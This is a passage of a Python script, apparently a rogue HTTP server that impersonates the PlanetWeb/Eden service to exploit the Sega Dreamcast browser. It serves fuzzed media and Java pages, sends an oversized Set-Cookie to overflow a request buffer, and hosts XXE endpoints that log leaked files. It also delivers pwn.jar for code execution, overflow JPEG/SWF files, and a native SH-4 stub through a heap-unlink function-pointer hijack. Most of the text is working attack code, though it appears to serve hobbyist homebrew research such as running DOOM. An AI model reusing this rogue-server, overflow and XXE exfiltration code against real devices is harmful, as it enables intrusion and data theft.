    if kind < CLASS_IN_LOOP and CLASS_BASE.exists():   # JAVA CLASS loader/verifier fuzz via <applet archive>
        data = _jar_pack(_class_mut(open(CLASS_BASE, "rb").read()))
        nm = "ff_%05d.jar" % bid
        open(str(FZ_DIR/nm), "wb").write(data)
        embed = '<applet code="Pwn.class" archive="/fuzz/%s" width=64 height=64></applet>' % nm
        page = '<html><head>%s</head><body bgcolor=black>%s%s</body></html>' % (driver[0], embed, driver[1])
        return page, bid
    jsseeds = glob.glob(str(FUZZ_SEEDS/"*.js"))
    if kind < 0.30 and jsseeds:                    # JS ENGINE fuzz: INLINE mutated <script>
        return _js_page(bid, driver), bid
    if kind < 0.42:                                # HTML LEXER fuzz: malformed body, loop driver kept in <head>
        nm = "ff_%05d.html" % bid; body = _html_fuzz()
        # beacon (attribution: registers /fuzz/ff_<n>.html in eden.log) + malformed body
        page = ('<html><head>%s</head><body bgcolor=black>'
                '<img src="/fuzz/%s" width=1 height=1>%s%s</body></html>'
                % (driver[0], nm, body, driver[1]))
        open(str(FZ_DIR/nm), "w").write(page)      # save the served page for attribution
        return page, bid
    if kind < 0.52:                                # gzip TRANSPORT fuzz: Content-Encoding: gzip + corrupt stream
        iext = random.choice([e for e in ("png","jpg","gif") if fmts[e][0]] or ["png"])
        raw = open(random.choice(fmts[iext][0]), "rb").read()
        data = _gzip_fuzz(raw)
        nm = "ff_%05d_gz.%s" % (bid, iext)         # "_gz." -> _serve_file sets Content-Encoding: gzip
        open(str(FZ_DIR/nm), "wb").write(data)
        embed = '<img src="/fuzz/%s" width=64 height=64>' % nm
        page = '<html><head>%s</head><body bgcolor=black>%s%s</body></html>' % (driver[0], embed, driver[1])
        return page, bid
    # normal media fuzz (image/audio) with structure-aware + AFL strategies
    ext = random.choice(pool); files, mut, _ = fmts[ext]
    corpus = _corpus(ext) or files; hdr = _HDR.get(ext, 8)
    r = random.random()
    if r < 0.50:                                   # structure-aware field mutation (format-specific)
        data = mut(open(random.choice(files), "rb").read())
    elif r < 0.75:                                 # AFL havoc on a corpus member (incl. crashers)
        data = _afl_havoc(open(random.choice(corpus), "rb").read(), hdr)
    elif r < 0.90 and len(corpus) >= 2:            # AFL splice two corpus members, then structure-mutate
        a = open(random.choice(corpus), "rb").read(); b2 = open(random.choice(corpus), "rb").read()
        data = mut(_splice(a, b2))
    else:                                          # combined: structure-mutate then havoc
        data = _afl_havoc(mut(open(random.choice(files), "rb").read()), hdr)
    nm = "ff_%05d.%s" % (bid, ext)
    open(str(FZ_DIR/nm), "wb").write(data)
    if ext == "swf":
        embed = '<img src="/fuzz/%s" type="application/x-shockwave-flash" width=64 height=64>' % nm
    elif ext == "wav":
        embed = ('<bgsound src="/fuzz/%s" loop=1>'
                 '<embed src="/fuzz/%s" autostart=true hidden=true width=2 height=2>' % (nm, nm))
    else:
        embed = '<img src="/fuzz/%s" width=64 height=64>' % nm
    page = '<html><head>%s</head><body bgcolor=black>%s%s</body></html>' % (driver[0], embed, driver[1])
    return page, bid


class Handler(BaseHTTPRequestHandler):
    server_version = "Apache"  # look unremarkable

    def log_message(self, fmt, *args):
        sys.stderr.write("    " + (fmt % args) + "\n")

    def log_error(self, fmt, *args):
        # capture the RAW request line on 400/bad-request -> reveals request-builder
        # corruption (overflow garbles the request line -> "Bad request version ...")
        raw = getattr(self, "raw_requestline", b"")
        sys.stderr.write("    [BADREQ] " + (fmt % args) + "  raw=" + repr(raw[:300]) + "\n")

    def _send(self, body, ctype, code=200, encoding=None):
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        if encoding:
            self.send_header("Content-Encoding", encoding)
        self.send_header("Content-Length", str(len(body)))
        # defeat the browser's page/image cache so each boot refetches fresh content
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.send_header("Expires", "0")
        # PATH A: oversized Set-Cookie -> browser stores it -> next request builds
        # "Cookie: %s" (unbounded sprintf) into its request buffer -> overflow.
        if COOKIE_N > 0:
            self.send_header("Set-Cookie",
                             "PA=" + "A" * COOKIE_N + "; path=/; domain=.planetweb.com; expires=Wed, 09-Jun-2027 00:00:00 GMT")
        self.end_headers()
        self.wfile.write(body)

    def _send_binary(self, body, ctype):
        """Resumable binary send via QUERY PARAM (/file?start=N) -- no client-side
        setRequestProperty (absent/breaks class-load in PersonalJava 1.1.8). The staging
        client re-opens with ?start=got so eden sends ONLY the missing tail, instead of
        re-reading the prefix over the flaky link (skip-resume could stall on a consistent
        drop point)."""
        import re as _re
        total = len(body)
        ms = _re.search(r"[?&]start=(\d+)", self.path)
        ml = _re.search(r"[?&]len=(\d+)", self.path)
        start = min(int(ms.group(1)), total) if ms else 0
        if ml:
            end = min(start + int(ml.group(1)), total)   # bounded chunk: [start, start+len)
        else:
            end = total
        chunk = body[start:end]
        self.send_response(206 if (start or ml) else 200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(chunk)))
        self.end_headers()
        self.wfile.write(chunk)
        if start or ml:
            print("    [CHUNK] %d-%d/%d (%d bytes)" % (start, end, total, len(chunk)))

    def _xxe_log(self, kind, data):
        try:
            with open("/tmp/xxe_hits.log", "a") as f:
                f.write(time.strftime("%H:%M:%S ") + kind + " :: " + str(data)[:4000] + "\n")
        except Exception:
            pass

    def _read_body(self):
        n = int(self.headers.get("Content-Length", 0) or 0)
        return self.rfile.read(n) if n else b""

    # ---- GET ---- #
    def do_GET(self):
        path = self.path.split("?", 1)[0]
        # CLEAN mode (sentinel www/CLEAN): stop the leftover fuzz/repro auto-refresh
        # churn -> serve a static no-refresh page for navigation + a 1x1 gif for any
        # image so nothing "breaks" and the browser settles (eases host load while
        # configuring the mail account).
        if (WWW / "CLEAN").exists():
            if path.lower().rsplit(".", 1)[-1] in ("gif", "jpg", "jpeg", "png"):
                return self._send(bytes.fromhex(
                    "47494638396101000100800000ffffff00000021f90400000000002c0000"
                    "0000010001000002024401003b"), "image/gif")
            if (path in ("/", "/junkyard.html", "/webguide", "/webguide/")
                    or path.startswith("/rp") or path.startswith("/sp") or path.startswith("/fz")):
                return self._send("<html><head><title>Home</title></head><body bgcolor=white>"
                                  "<h2>PlanetWeb (offline)</h2><p>Open the Command Compass to reach "
                                  "Mail / Options to configure your POP account.</p></body></html>",
                                  "text/html")
        ck = self.headers.get("Cookie")
        if ck is not None:
            print("[cookie] >>> victim sent Cookie header: %d bytes (host=%s)" % (len(ck), self.headers.get("Host")))
        elif path in ("/", "/rp/0") or path.startswith("/rp/n"):
            print("[cookie] (no Cookie on %s; host=%s)" % (path, self.headers.get("Host")))
        # ---- XXE endpoints (hit by the victim's XML parser resolving our entities) ----
        if path == "/xxe.dtd":
            print("[XXE] >>> /xxe.dtd fetched (parser is loading our external DTD)")
            self._xxe_log("dtd-fetched", self.path)
            return self._send(xxe_dtd(), "application/xml-dtd")
        if path == "/xxe-probe":
            print("[XXE] *** SSRF/XXE CONFIRMED: victim resolved an external entity -> %s" % self.path)
            self._xxe_log("ssrf-probe", self.path)
            return self._send("ok", "text/plain")
        if path == "/xxe-leak":
            from urllib.parse import unquote
            q = self.path.split("?", 1)[1] if "?" in self.path else ""
            leaked = unquote(q[2:]) if q.startswith("f=") else q
            print("[XXE] *** FILE EXFIL via XXE *** %d bytes:\n%s" % (len(leaked), leaked[:2000]))
            self._xxe_log("file-leak", leaked)
            return self._send("ok", "text/plain")
        if path == "/pwned":
            from urllib.parse import parse_qs, unquote
            q = parse_qs(self.path.split("?", 1)[1]) if "?" in self.path else {}
            devid = unquote(q.get("devid", [""])[0]); os_str = unquote(q.get("os", [""])[0])
            print("[TAKEOVER] *** browser hijacked to full-screen OWNED page *** devid=%s os=%s" % (devid or "(none)", os_str))
            return self._send(pwned_page(devid, os_str), "text/html")
        if path == "/PWNED_NATIVE":
            print("[RIDEXPLOIT] *** NATIVE CODE EXEC CONFIRMED *** SH-4 stub ran -> "
                  "openURL(/PWNED_NATIVE) from setRawDeviceID unlink -> fn-ptr hijack")
            return self._send("<html><body bgcolor=black text=lime><h1>NATIVE PWNED</h1>"
                              "<p>SH-4 stub executed via setRawDeviceID heap unlink.</p></body></html>",
                              "text/html")
        if path == "/ridexploit-armed":
            print("[RIDEXPLOIT] payload delivered (sendMessage(100) done); awaiting unlink + fn-ptr call")
            return self._send("<html><body>ridexploit armed</body></html>", "text/html")
        if path == "/armclose":
            # armexploit navigates here to CLOSE the armed dialog -> IM teardown
            print("[ARM] >>> /armclose (navigate to tear down the armed dialog context)")
            return self._send("<html><body>armclose</body></html>", "text/html")
        if path in ("/evil.jpg", "/evil2.jpg"):
            nm = path[1:]
            print("[JPG] >>> serving %s  ***native libjpeg heap-overflow image (get_sof/glue 32-bit malloc)***" % nm)
            return self._serve_file(nm, "image/jpeg")
        if (WWW/"JPGTEST").exists() and (path in ("/", "/junkyard.html", "/jpg")
                                          or path.startswith("/rp") or path.startswith("/sp")):
            which = "evil2.jpg" if (WWW/"JPGTEST").read_text().strip() == "2" else "evil.jpg"
            print("[JPG] >>> JPEG-overflow test page (img=/%s)" % which)
            return self._send('<html><head><title>jpg</title>'
                              '<meta http-equiv="refresh" content="6"></head>'
                              '<body bgcolor=black><img src="/%s?%d"></body></html>'
                              % (which, int(time.time())), "text/html")
        if path in ("/test.swf", "/evil.swf"):
            nm = path[1:]
            print("[SWF] >>> serving %s  ***native Flash player reachability/overflow test***" % nm)
            return self._serve_file(nm, "application/x-shockwave-flash")
        if (WWW/"SWFTEST").exists() and (path in ("/", "/junkyard.html", "/jpg")
                                          or path.startswith("/rp") or path.startswith("/sp")):
            swf = "evil.swf" if (WWW/"SWFTEST").read_text().strip() == "2" else "test.swf"
            print("[SWF] >>> Flash test page (embed=/%s)" % swf)
            return self._send('<html><head><title>swf</title>'
                              '<meta http-equiv="refresh" content="8"></head>'
                              '<body bgcolor=black>'
                              '<embed src="/%s?%d" type="application/x-shockwave-flash" width=64 height=64>'
                              '<img src="/%s?%d" type="application/x-shockwave-flash" width=64 height=64>'
                              '</body></html>' % (swf, int(time.time()), swf, int(time.time())), "text/html")
        if path in ("/edenclient.conf", "/eden.conf"):
            print("[1] >>> serving edenclient.conf (loginurl)")
            return self._send(edenclient_conf(), "text/plain")
        if path == "/pwn.jar":
            jar = CHAIN_JARS[CHAIN]
            print("[5] >>> serving pwn.jar  [chain=%s -> %s]  ***RCE: device downloading our code***"
                  % (CHAIN, jar.name))
            if not jar.exists():
                return self._send("build first (./build.sh)", "text/plain", 500)
            return self._send(jar.read_bytes(), "application/java-archive")
        if path == "/doom.jar":
            print("[5b] >>> serving doom.jar  ***pulled via Jar-Files: the DOOM engine***")
            if not DOOM_JAR.exists():
                return self._send("build doom.jar first (./build.sh)", "text/plain", 500)
            return self._send(DOOM_JAR.read_bytes(), "application/java-archive")
        if path == "/doom.wad":
            # stagedoom must serve the RENDERABLE iwad (doom1_trim: has TITLEPIC + sprites; the
            # tiny WADs lack them and the engine I_Errors on boot). The 3.8MB stream is made
            # reliable by StageDoom's large 256KB chunks (few picoppp connections), not by a
            # smaller WAD. stub_native.bin is baked for THIS wad's size (build_stage_native.py).
            wad = (ROOT/"wad"/"doom1_trim.wad") if CHAIN=="stagedoom" else (ROOT/"wad"/"doom1.wad") if CHAIN in ("nativedoom","heapprobe") else DOOM_WAD
            print("[6] >>> serving doom.wad ("+wad.name+")")
            if not wad.exists():
                return self._send("put an IWAD at wad/", "text/plain", 500)
            return self._send_binary(wad.read_bytes(), "application/octet-stream")
        if (path.startswith("/im") or path in ("/", "/junkyard.html") or path.startswith("/rp")) and (WWW/"IMPAGE").exists():
            # AUTO-REFRESH element-rich page: 6 links + a form = ~8 interface elements
            # (state-2 IM structs). Meta-refresh to a unique /im URL every 2s so the
            # browser continuously LOADS elements then TEARS THEM DOWN -> drives
            # sub_8C034920 (the IM-teardown loop that calls the unlink gadget).
            # STATIC page (no refresh) with dialog-arming links so the user can click
            # one. mailto:/pwreg: schemes open the address-book/registration IM dialogs
            # (sub_8C033584) that arm the gate 0x8C1B7488 + node structs.
            page = ('<html><head><title>arm</title></head>'
                    '<body bgcolor=white><h2>IM arming test</h2>'
                    '<a href="mailto:test@planetweb.com">CLICK: mailto (address dialog)</a><br><br>'
                    '<a href="pwreg:reg0">CLICK: pwreg (registration dialog)</a><br><br>'
                    '<a href="/im?a=1">L1</a> <a href="/im?a=2">L2</a> <a href="/im?a=3">L3</a><br>'
                    '<form action="/im" method="get"><input type="text" name="q" value="x" size="8">'
                    '<input type="submit" value="Go"></form>'
                    '</body></html>')
            print("[im] >>> STATIC arming page (mailto/pwreg links)")
            return self._send(page, "text/html")
        if path in ("/", "/junkyard.html"):
            if CHAIN == "fuzz" and (WWW/"REPRO").exists():
                # deterministic repro: home -> /rp/0 (pinned image sequence)
                print("[repro] >>> home -> /rp/0 (pinned fault repro)")
                return self._send('<html><head><meta http-equiv="refresh" content="1;url=/rp/0">'
                                  '</head><body bgcolor=black><script>location.href="/rp/0";</script>'
                                  'repro</body></html>', "text/html")
            if CHAIN == "fuzz" and (WWW/"SPECTRUM").exists():
                # spectrum-triage mode: home redirects into the one-per-page /sp/ run
                print("[spectrum] >>> home -> /sp/0 (LZW spectrum triage)")
                return self._send('<html><head><meta http-equiv="refresh" content="1;url=/sp/0">'
                                  '</head><body bgcolor=black><script>location.href="/sp/0";</script>'
                                  'spectrum</body></html>', "text/html")
            if CHAIN == "fuzz":
                # in fuzz mode the home page IS the auto-refresh fuzz loop entry
                html, bid = gen_fuzz_page()
                print("[fuzz] >>> home page = fuzz batch #%d (auto-refresh loop)" % bid)
                return self._send(html, "text/html")
            if CHAIN == "calc":
                # calc demo: the home page IS the calc POC, so it renders the instant the
                # browser goes online -- independent of whether the Eden subscription (the
                # RCE, [1]..[5]) re-fires. When the subscription DOES fire, the JAR's
                # openURL lands on this same page. Never show the DOOM splash here.
                print("[6] >>> serving calc.html as HOME  ***calc POC on screen***")
                return self._serve_file("calc.html", "text/html")
            print("[6] >>> serving junkyard.html  ***browser hijacked to splash***")
            return self._serve_file("junkyard.html", "text/html")
        if path == "/doom.html":
            print("[*] >>> serving doom.html  ***DOOM applet page (inline in browser)***")
            return self._serve_file("doom.html", "text/html")
        if path == "/calc.html":
            print("[6] >>> serving calc.html  ***code-exec proven: browser navigated to our page***")
            return self._serve_file("calc.html", "text/html")
        if path.startswith("/sp/") or path == "/sp":
            # LZW spectrum triage: ONE crafted GIF per page, auto-advance to next.
            # A HANG freezes the browser on /sp/<n> (last logged); a FAULT crashes.
            specs = sorted(p.name for p in (WWW/"spectrum").glob("*.gif"))
            m = re.search(r"/sp/(\d+)", path); n = int(m.group(1)) if m else 0
            if n >= len(specs):
                return self._send("<html><body>spectrum done (%d tested)</body></html>" % len(specs), "text/html")
            nm = specs[n]
            print("[spectrum] >>> #%d/%d : %s" % (n, len(specs), nm))
            html = ('<html><head><meta http-equiv="refresh" content="2;url=/sp/%d"></head>'
                    '<body bgcolor=black>%s<img src="/spectrum/%s" width=16 height=16>'
                    '<script>setTimeout(function(){location.href="/sp/%d";},2000);</script>'
                    '</body></html>' % (n+1, nm, nm, n+1))
            return self._send(html, "text/html")
        if path.startswith("/imf"):
            # a single frame's content (links + form = focusable interface elements)
            which = path.split("=")[-1]
            frm = ('<html><body bgcolor=white><b>Frame %s</b><br>'
                   '<a href="/imf?f=%s1">Link A</a><br><a href="/imf?f=%s2">Link B</a><br>'
                   '<form action="/imf" method="get"><input type="text" name="q" value="x" size="8">'
                   '<input type="submit" value="Go"></form></body></html>' % (which,which,which))
            print("[imf] >>> frame content %s" % which)
            return self._send(frm, "text/html")
        if path.startswith("/im") or ((path.startswith("/rp/") or path == "/rp") and (WWW/"IMPAGE").exists()):
            # MULTI-FRAME page: each <frame> is a managed content area -> registers
            # Interface-Manager nodes (the *(0x8C3402F4)/*(0x8C29AC2C) globals).
            frameset = ('<html><head><title>IMframes</title></head>'
                        '<frameset rows="40%,60%">'
                        '<frame src="/imf?f=top" name="top">'
                        '<frameset cols="50%,50%">'
                        '<frame src="/imf?f=left" name="left">'
                        '<frame src="/imf?f=right" name="right">'
                        '</frameset></frameset>'
                        '<noframes><body><a href="/imf?f=n">no frames</a></body></noframes>'
                        '</html>')
            print("[im] >>> MULTI-FRAME interface-manager page")
            return self._send(frameset, "text/html")
        if path.startswith("/rp/") or path == "/rp":
            if (WWW/"RPFUZZ").exists():
                # unattended fuzz via the online-savestate /rp loop: fresh mutation
                # per page, driving back into /rp/ (cache-proof). Crashes recovered
                # by fc_restore.sh. Exact attribution via /fuzz/ff_<n> samples.
                html, bid = gen_fuzz_page("/rp/")
                print("[rpfuzz] >>> /rp fuzz page #%d" % bid)
                return self._send(html, "text/html")
            # deterministic fault repro: pinned images from www/repro/, one per
            # page, slow auto-advance, looping. Use to reproduce a found FAULT
            # under the GDB stub (set bp in the decoder before navigating here).
            reps = sorted(p.name for p in (WWW/"repro").glob("*"))
            m = re.search(r"/rp/(\d+)", path); n = int(m.group(1)) if m else 0
            if not reps:
                return self._send("<html><body>no repro images</body></html>", "text/html")
            nm = reps[n % len(reps)]; nxt = (n + 1) % len(reps)
            ext = nm.rsplit(".", 1)[-1].lower()
            # cache-proof: unique token on BOTH the next-page URL and the image src
            # so the browser can't stick on a cached /rp/<n> page or image (lets the
            # full 36->37->38 sequence advance even mid-session).
            tok = random.randrange(1 << 30)
            # embed per type so isolation repro drives the correct decoder
            if ext == "jar":
                rembed = '<applet code="Pwn.class" archive="/repro/%s?z=%d" width=64 height=64></applet>' % (nm, tok)
            elif ext == "swf":
                rembed = '<img src="/repro/%s?z=%d" type="application/x-shockwave-flash" width=64 height=64>' % (nm, tok)
            elif ext == "wav":
                rembed = ('<bgsound src="/repro/%s?z=%d" loop=1>'
                          '<embed src="/repro/%s?z=%d" autostart=true hidden=true width=2 height=2>' % (nm, tok, nm, tok))
            else:
                rembed = '<img src="/repro/%s?z=%d" width=64 height=64>' % (nm, tok)
            print("[repro] >>> #%d/%d : %s" % (n % len(reps), len(reps), nm))
            html = ('<html><head><meta http-equiv="refresh" content="3;url=/rp/%d_%d"></head>'
                    '<body bgcolor=black>%s'
                    '<script>setTimeout(function(){location.href="/rp/%d_%d";},3000);</script>'
                    '</body></html>' % (nxt, tok, rembed, nxt, tok))
            return self._send(html, "text/html")
        if path.startswith("/fz/"):
            if (WWW/"REPRO").exists():
                print("[repro] >>> /fz/ diverted to /rp/0 (repro armed)")
                return self._send('<html><head><meta http-equiv="refresh" content="1;url=/rp/0">'
                                  '</head><body bgcolor=black><script>location.href="/rp/0";</script>'
                                  '</body></html>', "text/html")
            if (WWW/"SPECTRUM").exists():
                # armed for spectrum triage: divert the fuzz loop into /sp/0
                print("[spectrum] >>> /fz/ diverted to /sp/0 (triage armed)")
                return self._send('<html><head><meta http-equiv="refresh" content="1;url=/sp/0">'
                                  '</head><body bgcolor=black><script>location.href="/sp/0";</script>'
                                  '</body></html>', "text/html")
            # dynamic: mutate a FRESH batch + return an auto-refreshing page that
            # navigates to a new unique /fz/ URL -> continuous in-browser fuzzing
            html, bid = gen_fuzz_page()
            print("[fuzz] >>> batch #%d served (%d mutated images, auto-refresh %ds)"
                  % (bid, FUZZ_BATCH, FUZZ_REFRESH))
            return self._send(html, "text/html")
        if path == "/junkyard.gif":
            return self._serve_file("junkyard.gif", "image/gif")
        if path == "/doom.bin":
            print("[7] >>> serving doom.bin  ***native SH-4 DOOM engine -> staged to RAM***")
            p = ROOT / "build" / "doom.bin"
            if not p.exists(): return self._send("build doom.bin (native_doom; make)", "text/plain", 500)
            return self._send_binary(p.read_bytes(), "application/octet-stream")
        if path == "/stub.bin":
            # stagedoom uses the E1M1-sized stub (matches the smaller /doom.wad above);
            # every other path keeps build/stub.bin (the GDB demo's 3.4MB-trim stub).
            p = (ROOT/"build"/"stub_native.bin") if CHAIN=="stagedoom" else (ROOT/"build"/"stub.bin")
            print("[7b] >>> serving %s  ***native loader stub -> planted at fixed 0x8C29ADE8***" % p.name)
            if not p.exists():
                hint = "run build_stage_native.py" if CHAIN=="stagedoom" else "run build_stage_email.py"
                return self._send("build %s (%s)" % (p.name, hint), "text/plain", 500)
            return self._send_binary(p.read_bytes(), "application/octet-stream")
        # default: try www/ with a content-type guessed from the extension
        ext = path.rsplit(".", 1)[-1].lower() if "." in path else ""
        ctype = {"gif":"image/gif","jpg":"image/jpeg","jpeg":"image/jpeg","png":"image/png",
                 "wav":"audio/x-wav","swf":"application/x-shockwave-flash",
                 "jar":"application/java-archive","class":"application/java-vm",
                 "html":"text/html","htm":"text/html","js":"application/x-javascript"}.get(ext, "application/octet-stream")
        # gzip-transport fuzz files (ff_<n>_gz.<ext>) are served with the gzip
        # Content-Encoding so the browser runs them through inflate before decode.
        enc = "gzip" if "_gz." in path else None
        if "_gz." in path:  # content-type from the inner ext
            ie = path.rsplit(".",1)[-1].lower()
            ctype = {"png":"image/png","jpg":"image/jpeg","gif":"image/gif"}.get(ie, ctype)
        if path.lstrip("/").startswith("fuzz/"):
            print("[fuzz] >>> serving %s (%s%s)" % (path, ctype, " gzip" if enc else ""))
        return self._serve_file(path.lstrip("/"), ctype, optional=True, encoding=enc)

    def _serve_file(self, name, ctype, optional=False, encoding=None):
        f = WWW / name
        if not f.exists():
            msg = "(missing) " + name
            return self._send(msg, "text/plain", 404 if optional else 500)
        return self._send(f.read_bytes(), ctype, encoding=encoding)

    # ---- POST ---- #
    def do_POST(self):
        path = self.path.split("?", 1)[0]
        body = self._read_body()
        if path == "/login":
            m = DEVID_RE.search(body)
            devid = m.group(1).decode("ascii", "replace") if m else "0"
            print("[2] >>> POST /login  (device:id=%s) -> login:response, status=0" % devid)
            return self._send(login_response(devid), "text/xml")
        if path == "/discovery":
            print("[3] >>> POST /discovery -> 1 service, subscription-url=/subscribe")
            return self._send(discovery_response(), "text/xml")
        if path == "/subscribe":
            print("[4] >>> POST /subscribe -> service-download-url=/pwn.jar")
            return self._send(subscription_response(), "text/xml")
        if path == "/arm":
            text = body.decode("latin1", "replace")
            for ln in text.splitlines():
                tag = "  *** AUTONOMOUS FIRE ***" if "FIRED" in ln else ""
                print("[ARM] " + ln + tag)
            try:
                with open(ROOT / "arm_result.txt", "a") as f: f.write(text)
            except Exception: pass
            return self._send("ok", "text/plain")
        if path == "/heapdiag":
            text = body.decode("latin1", "replace")
            print("\n[RID DIAGNOSTIC] (%d bytes):" % len(body))
            for ln in text.splitlines():
                print("    " + ln)
            try: (ROOT / "heapdiag.txt").write_text(text)
            except Exception: pass
            print("[*] >>> saved -> heapdiag.txt\n")
            return self._send("ok", "text/plain")
        if path == "/heap":
            text = body.decode("latin1", "replace")
            print("\n[HEAP PROBE RESULT] (%d bytes):" % len(body))
            for ln in text.splitlines():
                print("    " + ln)
            try: (ROOT / "heap_probe.txt").write_text(text)
            except Exception: pass
            print("[*] >>> saved -> heap_probe.txt\n")
            return self._send("ok", "text/plain")
        if path == "/report":
            print("[*] >>> NATIVE recon report received (%d bytes):" % len(body))
            try:
                text = body.decode("latin1")
                rp = ROOT / "native_report.txt"
                rp.write_text(text)
                # show a quick summary: codes that returned OK (live native commands)
                oks = [ln for ln in text.splitlines() if "\tOK\t" in ln]
                print("    %d codes responded OK (live native commands); full -> %s"
                      % (len(oks), rp))
                for ln in oks[:40]:
                    print("      " + ln.replace("\t", "  "))
            except Exception as e:
                print("    (could not parse report: %s)" % e)
            return self._send("ok", "text/plain")
        print("[?] unexpected POST %s\n%s" % (path, body[:512]))
        return self._send("<ok/>", "text/xml")


def main():
    global EDEN_HOST, CHAIN
    ap = argparse.ArgumentParser(description="Eden rogue-server exploit driver")
    ap.add_argument("-b", "--bind", default="0.0.0.0")
    ap.add_argument("-p", "--port", type=int, default=80,
                    help="must be 80 (edenserverport default); needs root")
    ap.add_argument("--host", default=EDEN_HOST,
                    help="hostname to embed in served URLs (default eden.planetweb.com)")
    ap.add_argument("--chain", choices=("splash", "calc", "jdoom", "native", "overflow", "fuzz", "takeover", "ridexploit", "nativedoom", "heapprobe", "armexploit", "looparm", "stagedoom"), default="jdoom",
                    help="which payload chain to deliver at /pwn.jar")
    args = ap.parse_args()
    EDEN_HOST = args.host
    CHAIN = args.chain

    jar = CHAIN_JARS[CHAIN]
    print("=" * 64)
    print(" Eden MITM exploit server   chain=%s" % CHAIN)
    print(" impersonating http://%s:%d" % (EDEN_HOST, args.port))
    print(" point the Dreamcast's DNS for %s at this machine" % EDEN_HOST)
    print(" service jar: %s  (%s)" % (jar.name, "present" if jar.exists() else "MISSING - ./build.sh"))
    if CHAIN == "jdoom":
        print(" IWAD: %s  (%.1f MB)" % (DOOM_WAD.name, DOOM_WAD.stat().st_size/1e6 if DOOM_WAD.exists() else 0))
    print(" chain: conf->login->discovery->subscribe->pwn.jar" +
          ("->doom.jar->doom.wad" if CHAIN == "jdoom" else
           "->/report" if CHAIN == "native" else "->junkyard.html"))
    print("=" * 64)
    ThreadingHTTPServer((args.bind, args.port), Handler).serve_forever()


if __name__ == "__main__":
    main()
